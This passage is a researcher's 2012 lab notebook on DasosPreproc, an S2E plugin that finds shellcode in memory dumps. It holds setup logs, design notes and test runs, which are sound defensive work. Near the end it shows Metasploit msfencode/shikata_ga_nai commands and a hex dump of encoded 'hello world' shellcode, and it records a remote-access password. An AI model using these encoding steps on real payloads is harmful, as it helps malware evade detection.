       case Expr::Int16: write16(offset, val); return;
       case Expr::Int32: write32(offset, val); return;
       case Expr::Int64: write64(offset, val); return;
       }
     }
   }

   // Treat bool specially, it is the only non-byte sized write we allow.
   Expr::Width w = value->getWidth();
   if (w == Expr::Bool) {
     write8(offset, ZExtExpr::create(value, Expr::Int8));
     return;
   }

   // Otherwise, follow the slow general case.
   unsigned NumBytes = w / 8;
   assert(w == NumBytes * 8 && "Invalid write size!");
   for (unsigned i = 0; i != NumBytes; ++i) {
     unsigned idx = Context::get().isLittleEndian() ?-------------------------------Work since 9 Aug 2012
Done:
Get a pristine version of S2E-demo
Test demo (worked)
Install VMware Workstation -> didn't install so used VirtualBox
Copy all files off mucked up VM, list of patched files, and any notes needed (home dir, /usr/local/src, inside kate)
Add a virtual disk to S2E-demo to encap=/sulate any changes I make
Copy all files to S2E-demo spare disk
Install any Vbox add ons
Test demo (worked)
Build S2E in home directory
Test demo with build version (worked)
Copy pristine to a muckable copy (within ~/s2e/dasos/s2e)
Build muckable copy
Test muckable's demo
Build and ensure s2e boots with InsnTracker
Apply patches to muckable's s2e 
Build and test mucked-s2e
Install Syscall tracker
Test demo with new s2e
Test Syscall tracker 


Notes:
Within s2e home dir is a dir named s2e, this is all the demo code. I kept it pristine.
Within ~/s2e I put a symlink for the spare disk, the symlink is called ~/s2e/dasos and the disk is mounted to /mnt/RJFDasos which is /dev/sdb1 (formatted as ext3) which is a .vmdk of 10 GB. Within ~/s2e/dasos I copied ~/s2e as ~/s2e/dasos/s2e, this is the directory to muck with code in.

Cmd tracker:
cd ~/s2e/build - where the make file is
make - build the pristine version
launch - test it
mkdir ~/s2e/dasos/s2e - make a place to muck it up
cp -R ~/s2e/* ~/s2e/dasos/s2e/. - make a version to muck up
cd ~/s2e/dasos/s2e/build
make
changed all the scripts to use the modified path
edited according to the patch file and previous edits
edited s2e/s2e/qemi/Makefile.target to use plugins
../buildPluginsQuick.sh to test build
../buildPlugins.sh to do it for real



------------------------------Meeting notes 16 Aug 2012
Make preproc- find first syscall given ptr to buffer (return syscall number and addr), if no syscall return 0
on each insn len+=insn.len, store addrs in a cookie trail
given a buffer addr, make a variable that jumps to an offset within the buffer, make it symbolic so that s2e explores all possible offsets
determine which insns can write to memory, note those locations to make them symbolic values
Conditions:
1) Online: 1st syscall number and addr must match
2) Online: Insns must align
3) Offline: Total len > 15B
4) Offline: Current set of insns must not be a subset of previously captured insns
5) Offline: Every byte should be executed [at most/not more than] once

Design considerations:
-Track exeuction addresses and byte values
-On success output: addr and byte values of executed insns; syscall number; syscall addr

Deliverables:
-Preproc
-Port Valgrind method to S2E (for now, online features)



-------------------------------Work since 16 Aug 2012
Todo:
s2eget wrapper to exit via s2e on 1st system call
make the offset variable symbolic (modeling after fork and kill)

make backups and bring into GMU with me

done:
create and test s2eget (start with fresh booted s2e.raw with nons2e)
stop, savevm s2e-waiting, and exit vm
convert to qcow2, make DNM (Do Not Modify) copy
make Valgrind preproc code available to S2E VM
s2eget the shellcode wrapper program and exec built-in hello world
be able to execute shellcode with a variable that controls the offset within the buffer

Notes:
qemu suspend:
-Raw does not support this, qcow2 does.
-Press ctrl+alt+shift+2 for command mode.
-type: stop (to stop the vm execution); savevm <tag name> (saves memory/suspends to a tagged name that you can reference later); exit (to exit qemu).
-This does not create a separate snapshot file; instead the snapshot exists within the qcow2
-I am uncertain if you can use the disk with different snapshots or if there shouldn't be any changes made to disk (eg only use the disk for a single snapshot)
-To recall the snapshot use the -loadvm <tag name> command line arg when rerunning 

s2eget:
This program coordinates with an s2e plugin HostFiles. You give HostFiles an option in the config/lua for which directory s2eget can read. Then you run s2eget in the VM. If the VM is not in S2E mode, then it waits (ie so you can suspend it). If the VM is in S2E mode it reads the directory on the host for the file and writes it to the guest.
I have it read a tarball that is extracted and then a script from the tarball is ran. The tarball must be named pkg.tar and it must have contain a directory called runtime.dir that contains firstRan.sh. 



-------------------------------Work since above, Meeting notes 13 Sept 2012
Gave demo of S2E. Had issues with symbolically executing a variable. It did not seem to work like it should. Dr. Wang also saw how it did not work like it should. We expected it to branch at each condition that involved the symbolic variable, particularly whenever a branch contained a get_example (). However, only a branch would execute and the original state would act as if frozen. We decided to see if I could manually iterate a variable for all wanted values, and for each value create a state that S2E could manage (so we can still leverage their tools).

Deliverables:
-Be able to iterate through offset

Todo:
get DasosPreproc to fork new states


Done:
There is a lot to summarize here. Much is in the google drive document.
shellcode-wrapper uses a custom instruction to tell DasosPreproc plugin what memory range to listen to and what the EIP is
DasosPreproc uses that custom insn to track the PID and mem range and stops execution of the state when the first system call in the mem range is detected
offset variable cannot be symbolic, so I have developed a fuzzing extension to the DasosPreproc module, you put a custom insn as the assignment for any unsigned int and use the parameters to specify the range. 
It successfully modifies the variable. I tested this by setting the variable to 99 in userspace, calling the fuzz with range 5 to 5. The preproc detected that this was the final iteration and returned 5. Userspace then printed out that the value was 5. I also tried the same but when initialized the original state was suspended, and then resumed when fuzz_next was called and it was determined that it was the final state.


Notes:
A state is a klee branch of symbolic execution
I had difficulties writing/reading memory from the process directly. It as much easier to return the value in a register and then let userspace assign.



------------------------------Meeting notes 20 Sept 2012
Virtual Box is incompatible for our needs, forking fails in it.
Switch to VMware Workstation 9 with a trial license and Dr. Wang will buy a license shortly.



------------------------------Work since 20 Sept 2012
Downloaded VMware Workstation and got 30 day license
Downloaded S2E VM
Untared S2E VM into /home/rfarley3/VirtualMachines (it creates a var/s2e/vms directory where you find the s2e-demo vm)
Created a /home/vmware/vm, and added group vmware (adding rfarley3 to that group) and then chmod 775 and chown rfarley3:vmware to /home/vmware
Started vmware over ssh-x, loaded s2e-demo/S2E.vmx
Made snapshot "Untouched"
Started VM, tested ./launch (forks and kills)
Reverted to snapshot "Untouched"
Added shared folder /home/rfarley3/Downloads/dasos called hostrw (under /mnt/hgfs/hostrw)
Added USB functionality
Added 20GB HDD called S2E-rjf.vmdk
Made a snapshot "hardware and shared folders set up"
Booted, mkdir /mnt/RJFDasos, ln -s /mnt/RJFDasos ~/s2e/dasos, sudo fdisk /dev/sdb (new, primary, #1, 1-2610, write), sudo mkfs.ext3 /dev/sdb1
Added this to /etc/fstab: 
/dev/sdb1       /mnt/RJFDasos   ext3    defaults        0       1
sudo mount /dev/sdb1
sudo chown -R s2e:s2e /mnt/RJFDasos
rsync -rptv /mnt/hgfs/hostrw/Attempt2/* /mnt/RJFDasos/.
ln -s s2e/s2e/qemu/Makefile.target PluginsMakefile
Went online and downloaded teamviewer
Edited backup.sh to use Attempt3, clean out old items, ./backup.sh
Made snapshot tmp
Teamviewer has dependencies, use Ubuintu Software Center to install it (find teamviewer_linux_x64.deb in nautilus and double click it), you may get an error to fix broken dependencies on the system, allow it.
Set /usr/bin/teamviewer7 as a start up item (disable bluetooth, evolution, power manager, print queue applet, remote desktop, ubuntu one, update notifier, visual assistance).
Ran teamviewer and set it up to auto login, accept incoming lan connections, gave it a predefined password ?"}|\]'/, changed strength to 6 characters  "
On remote computer login with teamviewer, in computers and contacts click on the add partner (looks like a bust), select ID (computer) put in the ID, alias and leave the password blank.
Made snapshot temp, delete tmp
Shutdown, Make bridged networking, add mac address (00:0c:29:10:d3:9c) into dhcp server (airport utility, network, change 10.0.1.61:s2e-demo's mac.
Test boot within Gui, see if it boots, ran s2e over teamviewer
sudo apt-get install kate vim openssh-server
Test ran s2e fork and kill again
Made Base Environment Complete, delete temp, suspend, exit workstation, go headless (vmrun start <vmx> nogui)
Made a diff/patch between my source and untouched source to find out how many changes, I've made, try to reverse as many as possible.
Reverted /qemu/s2e/S2EExecutionState.h, /qemu/s2e/S2EExecutionState.cpp, /qemu/s2e/S2EExecutor.cpp to original (before me, untouched, etc) versions.
Made copies and let makefile handle syncing of the following:
s2e@ubuntu:~/s2e/dasos$ cp PluginsMakefile ./Plugins-Makefile.target
s2e@ubuntu:~/s2e/dasos$ cp s2e/s2e/qemu/exec-all.h ./qemu-exex-all.h
s2e@ubuntu:~/s2e/dasos$ cp s2e/s2e/qemu/s2e/Plugin.cpp ./PLugins-Plugin.cpp
s2e@ubuntu:~/s2e/dasos$ cp s2e/s2e/qemu/s2e/Plugins/Opcodes.h ./Plugins-Opcodes.h
s2e@ubuntu:~/s2e/dasos$ cp s2e/s2e/qemu/s2e/Plugins/ExecutionTracers/TraceEntries.h ./ExecutionTracers-TraceEntries.h
s2e@ubuntu:~/s2e/dasos$ cp s2e/s2e/qemu/target-i386/translate.c ./i386-translate.c
s2e/Plugins/ExecutionTracp s2e/s2e/guest/include/s2e.h ./guestinclude-s2e.h
Now should the source tree get written over or lost, the versions that I edited will persist in my devel directory. Note that now all edits to any of the above must be done within the devel directory, and if any further files in the source tree need to be edited, then move them into the devel directory and make a makefile publish target for them as well.
The directory structure of the devel dir was significantly changed to be clearer, makefile was changed to match.
When files were copied to the VM symlinks were lost within dasos/s2e/build and I had to make a script to manually enumerate the symlinks and match them up to the existing files and then recreate those symlinks within our copy of the source. The script to do this is getsyms.sh.
Makefile targets tested: publish, build-test, build, test.
Put tut1 onto Vitaly's VM. (cd ~/s2e; launch; scp -P 2222 dasos/Tutorial1/tut1retry.c 127.0.0.1:~/s2e/.)
Tried it on our VM (make tut1-run). 
Made stubs iteration, at first tried to do an iterative based on saving state0 and then forking each time from it, however, s2e would resume state0 implicitly and then I'd loose my pristine state0 to fork from
Made a new iterative that forked all at once, this worked, but would die at 1000+ states. I tried max memory at 1.2G, 700M, 500M, 200M and none worked.
Finally made an iterative fork that would fork state0 and return state1 with a given value and return state0 with a canary value. s2e always executes forked states before original states, so I made it run depth-first-search; thus state1 must finish before it rturns to state0. State0 just loops to the next value and forks for it, repeat. 



------------------------------Work since 2 Oct 2012
When I moved to shellcode-wrapper I got segfaults that prevented the state from getting a s2e_kill (), so I made a s2ekill.c and call its binary within firstRan.sh after the guest code I wish to observe, thus any zombies/orphans are killed by it and the DFS can continue.
Ran this together and got this result:
s2e@ubuntu:~/s2e/dasos$ grep "EIP" s2e-last/debug.txt
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
62 [State 1] Terminating state 1 with message 'EIP reached, success'
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
68 [State 3] Terminating state 3 with message 'EIP reached, success'
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
69 [State 4] Terminating state 4 with message 'EIP reached, success'
>> EIP Found. Syscall number 804b004 at addr 0x804b08e from pid: 86716416
74 [State 6] Terminating state 6 with message 'EIP reached, success'
>> EIP Found. Syscall number 804b087 at addr 0x804b08e from pid: 86716416
80 [State 8] Terminating state 8 with message 'EIP reached, success'
>> EIP Found. Syscall number 804b089 at addr 0x804b08e from pid: 86716416
86 [State 10] Terminating state 10 with message 'EIP reached, success'
>> EIP Found. Syscall number 804b08a at addr 0x804b08e from pid: 86716416
86 [State 11] Terminating state 11 with message 'EIP reached, success'
>> EIP Found. Syscall number 804b08c at addr 0x804b08e from pid: 86716416
92 [State 13] Terminating state 13 with message 'EIP reached, success'
>> EIP Found. Syscall number 804b08e at addr 0x804b08e from pid: 86716416
97 [State 15] Terminating state 15 with message 'EIP reached, success'
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
114 [State 22] Terminating state 22 with message 'EIP reached, success'

Modified custom insn to pass the syscall number so I can have the plugin enforce that they match
This allowed me to filter out false successes, now get:
s2e@ubuntu:~/s2e/dasos$ grep "EIP" s2e-last/debug.txt
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
27 [State 1] Terminating state 1 with message 'EIP reached, success'
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
30 [State 3] Terminating state 3 with message 'EIP reached, success'
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
30 [State 4] Terminating state 4 with message 'EIP reached, success'
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
56 [State 22] Terminating state 22 with message 'EIP reached, success'


Here is a list of what our Valgrind tool can do:
Code:
// now see if this insn's last byte precedes the EIP, ie this was where we caught it
if (insnAligns (bb->stmts[i]->Ist.IMark.addr, bb->stmts[i]->Ist.IMark.len) )
   if (shell_len > 15 && byte was not executed within another shellcode string () )
// if this loop has gone on long enough, then exit
if (shell_exec_cnt[bb->stmts[i]->Ist.IMark.addr - shell_base] > 100) {
// if not the insn before the captured syscall, then peek ahead, see if the next instruction is a system call, if so, then exit
// note that this doesn't catch shell code which jumps to a syscall
if (bb->stmts[i]->Ist.IMark.addr != (eip - 2 - bb->stmts[i]->Ist.IMark.len) && isAddrSyscall (bb->stmts[i]->Ist.IMark.addr + bb->stmts[i]->Ist.IMark.len) ) {

Online:
-Enforces EIP alignment: Reports 1st occurrence of an insn that precedes (physically, not logically) a system call that aligns with EIP
-Stores executes byte addresses in a cookie trail
-Analyses cookie trail to make sure total executed bytes > 15B
-Any byte should be executed [at most/not more than] once
-If in a loop more than 100 times abort
Offline:
-Each cookie trail (set of insns) must not be a subset of previously captured insns (enclosure)
-Report back the cookie trail with the highest density (number of executed bytes divided by (the highest address minus the lowest address))


Currenlty, how does that relate to our S2E tool:
Online:
+Enforces EIP alignment: Reports true 1st syscall and verifies that the system call number matches
Offline:
-nothing

What I need to do:
-Track executed bytes
   -Enforce tot > 15
   -Enforce that a string (a cookie trail of executed bytes) is not a subset of earlier successful strings
   -Detect infinite loops and abort
   -Report a density function

Incorporated code from InstructionCounter.cpp which uses ExecutionTracer (I was thinking of using this anyways). I set it up that when the custom insn is called, a callback is set on every instruction. At each instruction it is determined if it is within the shellcode, if so, then a counter is incremented. So, while we don't do a Byte counter we still have a metric for length.

4 Oct
Ignore minimum instruction count requirement, need more data to make an educated guess on value.
Added PC tracking vector
Added vector to store all successful runs (a vector of PC tracking vectors)
Added filter to not store any match whose PC tracking vector is a subset of any successful run element
There was an issue with signals from the code I copied in yesterday so I simplified it
It was still attempting to store PCs multiple times, so I added a filter that only appends PCs if they do not equal the last PC stored (not that it should be impossible for AMS to execute the same insn immediately after itself anyways). I believe that it did this bc the ASM insn was broken down into multiple LLVM IR insns, such that the onTranslateInsn was called (for some reason) at every LLVM IR insn which was associated with the single ASM PC addr.

Currenlty, how does that relate to our S2E tool:
Online:
+Enforces EIP alignment: Reports true 1st syscall and verifies that the system call number matches
+Enforces count of instructions instead of Bytes (this is not enabled currently)
+Does an online enforcement that any success is not a subset of a previous success
Offline:
-nothing

What I need to do:
-Track executed bytes
   -Detect infinite loops and abort (the point to insert this code is noted)
   -Report a density function (for this I'd need to know all the bytes used instead of just the first byte of the insn).


Main todo: see if I can extract the actual insn and all its bytes or at minimum its length
Make a visual memory map output

5 Oct
Made a memory map. The index is the PC-base, it is a vector of vectors of vectors. The first vector is the index of PC-base. The second is for each time that PC is called. The third is for the byte values for each instance the PC is called.
If mem_map[pc-base].size > 3 then that PC has been executed 3 times, abort predicting that it is in an infinite loop. Ideally this should analyze the loop and find if all PCs' intances' byte values are the same (therefore infinite loop and not polymorphic shellcode).
Made a visual memory map output, but it's not complete bc I need to be able to read the values raw from memory
Made a visual indicator if PCs were executed more than once

To do:
Be able to get the raw memory values for the insns: print them in the PC cookie trail debug output and store them in the mem_map
Extend visual indicators to see if any bytes at PCs were changed (to denote if anything self modifying)
Print ascii values in mem_map
Print disasm strings in mem_map
Print a memory map that shows the order of the bytes being called on a memory map
Report a density function



/home/s2e/s2e/dasos/s2e/./s2e/qemu/i386-dis.c <- dissassembler "e function returns the length of this instruction in bytes"
/home/s2e/s2e/dasos/s2e/./s2e/qemu/dis-asm.h
/home/s2e/s2e/dasos/s2e/./s2e/qemu/target-i386/translate.c
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/Plugins/CorePlugin.h:/** A type of a signal emitted on instruction execution. Instances of this signal
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/Plugins/CorePlugin.h:            uint64_t /* ending instruction pc */,
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/Plugins/CorePlugin.h:    /** Signal that is emitted on code generation for each instruction */
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/Plugins/CorePlugin.h:            uint64_t /* instruction PC */>
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:void s2e_tcg_custom_instruction_handler(uint64_t arg);
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:/** Called by the translator when a custom instruction is detected */
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:void s2e_tcg_emit_custom_instruction(struct S2E* s2e, uint64_t arg);
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:/** Called by cpu_gen_code() before translation of each instruction */
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:void s2e_on_translate_instruction_start(
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:/** Called by cpu_gen_code() after translation of each instruction */
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:void s2e_on_translate_instruction_end(
/home/s2e/s2e/dasos/s2e/./s2e/qemu/exec-all.h:struct TCGLLVMTranslationBlock;
/home/s2e/s2e/dasos/s2e/./s2e/qemu/exec-all.h:struct S2ETranslationBlock;
/home/s2e/s2e/dasos/s2e/./s2e/qemu/exec-all.h:struct TranslationBlock {
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutor.h:struct TranslationBlock;
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutor.h:struct S2ETranslationBlock
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutionState.h:    struct TranslationBlock;
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutionState.h:struct S2ETranslationBlock;


translate.c <- insn handler

/* convert one instruction. Return the next pc value */
i386-translate.c:static target_ulong disas_insn(DisasContext *s, target_ulong pc_start):4231
 next_byte:
    b = ldub_code(s->pc);
    s->pc++;
same file line 1000
typedef struct DisasContext {
   ...
    target_ulong pc; /* pc = eip + cs_base */  // RJF This is the current byte that the disasm is working on (s->pc)
    /* current block context */
    target_ulong cs_base; /* base of CS segment */ // RJF what is this?
    struct TranslationBlock *tb; // Look, it has a tb built into it, can we use this to pass info to S2E?

We really want  tb->size to survive, look how in translate-all.c it stores: s->code_in_len += tb->size; to survive.
s is TCGContext *s = &tcg_ctx;  global within translate-all.c
The actual ASM to Qemu IR is done by this: gen_code_size = tcg_gen_code(s, gen_code_buf);


Tracking tb->size leads to /home/s2e/s2e/dasos/s2e/./s2e/qemu/target-i386/translate.c:    gen_intermediate_code_internal(...); tb->size = pc_ptr - pc_start;

s2e_oTI_start is 8043, but tb_.size isn't set until 8128 (if !search_pc) is this a way to do dry runs or something?
So instead link in at on_TranslateInstruction_End... 
static inline void gen_instr_end(DisasContext *s)
{
    if (!s->done_instr_end) {
        s2e_on_translate_instruction_end(g_s2e, g_s2e_state, s->tb, s->insPc, s->useNextPc ? s->nextPc : (uint64_t)-1);
        s->done_instr_end = 1;
    }
}

Added exec-all.h:223 within struct TranslationBlock: 
    uint8_t lenOfLastInstr; /* XXX: RJF, allows translate.c to report back instruction length */
Added i386-translate.c:4231-4235 within disas_insn:
    s->tb->lenOfLastInstr = 0; // RJF
 next_byte: 
   ...
    s->tb->lenOfLastInstr++; // RJF

I had to extend this for every time s->pc was incremented in all functions of the file. It worked.
I added ascii output to mem_map
The output reports a density function
shellcode wrapper can accept a limit on the cases of offsets it runs (for debug testing)

To do:
Print disasm strings in mem_map

Make a README that describes the directory and its files
Make a README for subdirectories that are confusing, like DiskImgs




------------------------------Meeting 9 Oct 2012
Make a multi snapshot mem_map
Finish by end of week
Start working on related work and turn into the comprehensive reading list, needs to be done within 2 wks and do the comp by Dec 1 (before exam business for the profs)
Once down with readling list do tech section of a paper on this topic to turn into proposal, get down with it by mid-december to do proposal by early january


There are three original goals:
1) Find exploit code
2) Find exploited function or buffer
3) Find original attack string

The proposal will probably consist of finishing the 3 goals and extending our product to work on windows




------------------------------Work since 2 Oct 2012
Oct 10 work since meeting
Extended visual indicators to show if any bytes within a snapshot were executed multiple times
Extended the memory map to have snapshots whenever a byte is modified
Cleaned up the trace interface
Note that the desnity function is only done per snapshot, so if polymorphic is done, then we need to extend it to take the fact taht the density needs to be calc'ed over multiple snapshots: my idea is to do a foreach i 0..len { foreach j 0..snapshots { if mem_map[j][i].times_execed > 0 { num_bytes_execed++; if i < min, min = i; if i > max, max = i; } } } So we superimpose all snapshots together, finding the min addr and max addr amonst all, and then the size of the set of unique executed pcs/byte_offsets (size of the union of each snapshot's set of i}. In other words if snapshot1 did 0 to 10 and snapshot2 did 5 to 15, then min is 0, max is 15 and num_bytes_execed is 15 {0..15}; another example s1:5 to 10; s2:8 then jmp to 1 to 3; s3:1 then jmp to 12 to 15; min is 1, max is 15, num_bytes_execed is 12 {1..3,5..10,12..15}.

got the data struct going:
// keep track of insns executed
// make an array of insns that become a trace
// start by defining an insn, leverage memory snapshots to avoid duplicating data
struct insn_instance {
   uint32_t snapshot_idx;  // which snapshot
   uint64_t pc;            // offset/pc of insn NOTE: within the snapshot (ie pc - cfg.base_addr)
   uint16_t len;           // num bytes of insn
   //Store insn byte string... Maybe? Or llvm ir decoding? Or disasm?
};

// as insn are executed, add them to mem map snapshot stack,
//and then note which stack index as well as the pc and byte len within index
typedef std::vector<struct insn_instance> Trace;

// keep track of memory bytes executed as a memory map
// but they can change, so anytime a previously execed byte changes, make a new empty snapshot and start filling it in
// ie make a stack of snapshots
// start by making the basic element
struct mem_byte {
   uint8_t byte;           // value of this byte
   unsigned times_execed;  // times this byte was executed (eg if it is uninitialized or were in a loop)
};

// make an array of mem_bytes the length of the input buffer
typedef std::vector<struct mem_byte> Snapshot;

class DasosPreprocState: public PluginState {
private:
   // an array of insn pcs (plus lens and corresponding snapshots) appended as executed (in order of execution)
   Trace trace;
   
   // a stack of snapshots
   std::vector<Snapshot> mem_map;

End of Oct 10:
Get dasosUdcli compiled so I can have disasm print outs
do some find within buffer tests of live dumps; do some collisions (random buffers); do some poly morphic tests


End of Oct 12:
Incorporated libudis86 into the plugin. You must add -ludis86 to the libs+= in the plugins makefile. And store the raw assembly into a uint8_t array (the var named raw below) and then the following fn will take care of the callbacks udis86 needs: ud_set_input_buffer(&ud_obj, raw, len);
Made a successes stack to track successes, and then when the guest finishes it can call s2e_dasos_preproc_fini to get the plugin to output any stats or other data that it has. I started making all the accessors work independently of a "state" and expanded the successes into a struct to hold stats data. I got it to compile and it successfully finds all the same successes, but all my debug output has disappeared... OK it's back. Outputting maximum density doesn't seem to work, bc I haven't yet calc'ed the overall density.

Todo: 
-Make the success's density function
-Run the preprocessor on the ghttpd dump


End of Oct 16:
Made a success density function. Remember that a success contains a memory map. There are two types- average: which is the sum of the snapshot densities divided by the number of snapshots; and overlay: which is the number of unique executed bytes across all snapshots divided by the range across all snapshots (the maximum PC from any snapshot minus the minimum PC in any snapshot). Average is a good inidcator of well grouped snapshots that might be spaced distantly (shellcode that jumps alot or is broken up across lots of memory); Overlay is good for shellcode which is clumped together and removes densities impacted by large jmps within the single code block.
I modified alot of the code to be clearer and reduced the number of functions, primarily by removing calls to objects within DasosPreprocState that were also within DasosPreproc.

I started to get the packer going. I downloaded UPX and then brought over the libDasosf code to be able to make collision tests and read in raw code. There is a file called fakeDumpGen that reads in a shellcode, it'd be good to incorporate UPX into that. Also consider adding the capability for our system to work without an EIP, or for it to extend the monitored memory ranges on the fly (in case a write extends the buffer beyond monitored range). Perhaps put it into shellcode-wrapper...

Integrated fakeDupmGen.c and then try some packing. Work from line 122 to 160, what is decodeShell? and storeIntoShell?
i stopped trying to get shellcode wrapper compiled, type conversion errors and somthing to do with the enum in a switch


End of Oct 23:
Modified DasosPreproc.cpp to handle eip=0 and syscall_num=1024 (neither being set)
Worked out some Makefile stuff
Ran test with helloworld and eip set, success
Ran test with helloworld and eip not set, hang at offset 30, didn't do it again... ?, success
Ran test with hw and eip nor syscall set, success
Converted dasosfDumpPrint.c to new system (small mods like removing libdisasm (libbastard))
Ran sw and output hello to dump file, success; raw file, success
I went to run the dump of HW and after a while S2E gave memory errors.

Notes:
I may need to consider the case when the insn is a jmp or write to out of specified range: if so, then extend monitored mem range.
There may be a compatibility issue going back and forth between 32 and 64b systems for the size of the addresses.


End of Oct 24:
./dasosf -p -x                               # print hw, exec hw
./dasosf -p -o hw -r -x                      # print hw, output hw.rawshell, exec hw
./dasosf -i hw.rawshell -p                   # input hw.rawshell, print it, do not exec it
./dasosf -i hw.rawshell -x                   # execute hw.rawshell
./dasosf -p -o hw -x                         # print hw, output hw.dump (with eip/syscall), exec hw
./dasosf -i hw.dump -p                       # input hw.dump, print it, do not exec it
./dasosf -i hw.dump -x                       # execute hw.dump
./dasosf -i hw.dump -o hw2 -r -p             # input hw.dump, print hw.dump, output hw2.rawshell, do not exec hw.dump 
                                             # (note that hw2.rawshell is the raw dump of hw.dump.shell (so it includes the filler)
# hw2.rawshell should match hw.dump.shell    # YES
./dasosf -i hw.rawshell -o hw2 -p            # input hw.rawshell, print hw.rawshell, output hw2.dump (no eip/syscall), do not exec hw.rawshell
# hw2.dump should show diff eip than hw.dump # YES
./dasosf -i hw.rawshell -e 16 -o hw3 -p      # input hw.rawshell specify eip, print hw.rawshell, output hw3.dump, do not exec hw.rawshell
# hw3.dump should show same eip as hw.dump   # YES
./dasosf -p -o hw4 -t r                      # print hw, output hw4.dump with random fill, do not exec
./dasosf -i hw4.dump -p                      # should have random fill YES
./dasosf -i hw.rawshell -o hw5 -t r -p       # input hw.rawshell, print hw.rawshell, output hw5.dump (no eip/syscall) with random fill, do not exec 
 
Do an S2E run with inputed dump/raw hw, with/without eip
./shellcode-wrapper -x                           # test default
# Why doesn't brute force find the 2nd syscall within HW <- it does
# YES
./shellcode-wrapper -i hw.rawshell -e 16 -x      # test inputting a rawshell (with eip)
# YES
./shellcode-wrapper -i hw.rawshell -x            # test inputting a rawshell (without eip/syscall)
# got error that eip was known... due to not removing setting if source_type changed from HW. fixed. 
# YES
./shellcode-wrapper -i hw.dump -f 496 -c 22 -x   # test inputting a dump (with eip/syscall)
# was not doing more than 1 fork... needed to make a temp var to store return from fuzz_fork. fixed.
# YES
./shellcode-wrapper -i hw2.dump -f 496 -c 40 -x  # test inputting a dump (without eip/syscall)
# incorrect shellcode to dump creation gave a false eip, fixed. dump input didn't consider case when eip is unknown, fixed.
./shellcode-wrapper -i hw2.dump -x               # test inputting a dump (without eip/syscall) and no offset/cases
# KLEE reported memory cap issues, so commented out two lines in .lua: 
      --"--max-memory-inhibit=true",
      --"--max-memory=700",
# YES, ran 1024 states in 915 seconds
./shellcode-wrapper -i hw4.dump -x            # test inputting a dump (with eip/syscall) with rand fill
# froze on state 70. make a disasm for offsets as an option for print, also the eip seems wrong (figure out linker stuff in makefile and try out -d x,y cla)
# disasm didn't help much, but there was an odd jmp, so I followed a hunch to have our system kill any insns that run out of bound of our module we monitored
# At the end of every insn, need to test if the next PC is within the module, if not, then terminateEarly.
# it found many that jumped out of bounds and dramatically sped up our system, ran 1024 states in 558 seconds
# Found true HW, but with two prepended vestigal insns
./shellcode-wrapper -i hw5.dump -x            # test inputting a dump (without eip/syscall) with rand fill
# found 3 scodes, but density of legit one was order of magnitude more dense (.10 and .18 vs .80+)

I made a normalizeShellcode function which acts as a preprocessor. The S2E plugin detects if the syscall happens in state[0], if so, it calls onFiniPreproc which outputs the success (since there should be only 1). normalizeShellcode is nearly the same as execShellcode, except it doesn't do symbex offset. However, the user can specify an offset. It is also extensible enough that the user could specify the eip or sysc should they have it, but since the s2e plugin works without them, they don't seem necessary at the moment.

Pack outputted hello and run

Install Metasploit to use msfencone and shikata-ga-nai encoder, follow these instructions: http://carnal0wnage.attackresearch.com/2010/03/msfencode-msfpayload-into-existing.html

I encoded the default: msfencode -c 1 -i msfe-in.rawshell -t raw -o msfe-out-sganai.rawshell -v -e x86/shikata_ga_nai
And then tested it with 
[s2e@s2e:~/s2e/dasos/ByteArrays]$ ./dasosf -x -i msfe-out-sganai.rawshell 
<< Requesting execution
Shell start_addr: 0xff900e60, +512: 0xff901060, length: 68B, range: 68B, end_addr: 0xff900ea3
           0 1 2 3  4 5 6 7  8 9 a b  c d e f   ASCII
0xff900e60 dad4b892 ba1e5cd9 7424f45b 29c9b10b  ......\.t$.[)...
0xff900e70 83c30431 43140343 8658ebb7 b5c52588  ...1C..C.X....%.
0xff900e80 09f174d3 2acba451 a3e6c926 bab304c6  ..t.*..Q...&....
0xff900e90 54ab6838 5b64f2ab cf1ad013 788a5a38  T.h8[d......x.Z8
0xff900ea0 e27591cd                             .u..            

<< Calling shell: 0xff900e60 (adjusted by offset of 0), of len: 68 with eip: 0x00000000 (7336352) and syscall: 1024
Hello, world!

So it works, but then when I run it in the preprocessor it goes out of bounds...
21 [State 0] Message from guest (0xbfa085ec): << Within normalizeShellcode with params, f: 0
21 [State 0] Message from guest (0xbfa085ec): << About to call dasospreproc_init with shell: 0xbfa08f90 (offset of 0 not yet applied), shell_len: 68
21 [State 0] Warning: EIP is not set, there may be false positives
>> Recv'ed custom insn for a DasosPreproc memory segment within pid 107851776, addr range: 0xbfa08f90-0xbfa08fd4 with eip: 0x0 buffer length: 68 and syscall number: 1024
21 [State 0] ERROR: we've left our module/shellcode, just ran insn @0xc1270c69, terminateStateEarly
>> Printing PC Trace (instructions in order of execution)
>>      1   1B @0xbfa08f90:*da                invalid                 
>>      2   2B @0xbfa08f90:*da d4             fcmovbe st0, st4        
>>      3   5B @0xbfa08f92: b8 92 ba 1e 5c    mov eax, 0x5c1eba92     
